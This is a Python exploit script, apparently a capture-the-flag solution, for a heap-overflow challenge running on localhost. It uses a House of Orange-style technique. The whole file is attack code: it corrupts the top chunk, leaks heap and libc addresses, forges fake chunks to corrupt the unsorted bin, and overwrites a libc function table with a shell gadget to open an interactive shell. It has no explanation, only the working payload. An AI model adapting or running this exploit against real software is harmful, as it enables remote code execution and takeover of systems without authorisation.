from pwnlib import *

def c():
	return s.ru("Your choice : ")

def build(name, namelen=None, price=123, color=1):
	if namelen is None:
		namelen = len(name)
	s.send("1\n")
	s.ru("Length of name :")
	s.send("%d\n" % namelen)
	s.ru("Name :")
	s.send(name)
	s.ru("Price of Orange:")
	s.send("%d\n" % price)
	s.ru("Color of Orange:")
	s.send("%d\n" % color)
	return c()

def upgrade(name, price=456, color=2, retn=True):
	s.send("3\n")
	s.ru(" :")
	s.send("%d\n" % -1)
	s.ru("Name:")
	s.send(name)
	s.ru(": ")
	s.send("%d\n" % price)
	if retn:
		s.ru(": ")
		s.send("%d\n" % color)
		c()


s = Socket(("localhost", 6767))
c()


build("AAAA")

payload  = "A"*0x10
payload += pq(0)
payload += pq(0x10) # SIZE
payload += "B"*0x10 # chunk contents
payload += pq(0)
payload += pq(0xfa1) # SIZE
payload += "this is the top chunk"
upgrade(payload)

build("B"*8, 0xfb0)
build("C"*0x18, (0x500 + 0x900 + 0xc0))

s.send("2\n")
s.ru("C"*0x18)
heap_ptr = uq(s.ru("\nPrice").ljust(8, '\0'))
c()

print "heap: 0x%x" % heap_ptr


fake_chunk_addr = heap_ptr + 0x10
fake_chunk2_addr = heap_ptr + 0x30

fake_chunk  = pq(0)
fake_chunk += pq(0x1001)
fake_chunk += pq(1)
fake_chunk += pq(fake_chunk2_addr) 

fake_chunk2  = pq(0)
fake_chunk2 += pq(0x21)
fake_chunk2 += pq(2)
fake_chunk2 += pq(fake_chunk_addr - 0x10) # this is bck; we write to bck->fd.

payload  = fake_chunk
payload += fake_chunk2
payload  = payload.ljust(0xee0, "C")
payload += pq(0)
payload += pq(0x21) # SIZE
payload += pq(fake_chunk_addr) # FD
payload += pq(fake_chunk_addr) # BK

upgrade(payload)

build("\x20", 0xff0)

s.send("2\n")
s.ru("Name of house : ")
libc_ptr = uq(s.ru("\nPrice").ljust(8, '\0'))
libc_base = libc_ptr - 0x3c3b20
assert libc_base & 0xfff == 0
c()

functab_addr = libc_base + 0x3c46f8
shell_gadget = libc_base + 0xef9f4

payload  = "A"*0x638
payload += pq(shell_gadget)
payload += "B"*(0xee0 - len(payload))
payload += pq(functab_addr + 2)

price = (heap_ptr >> 16) % (1<<32)

upgrade(payload, price=price, color=1, retn=False)

s.interact()
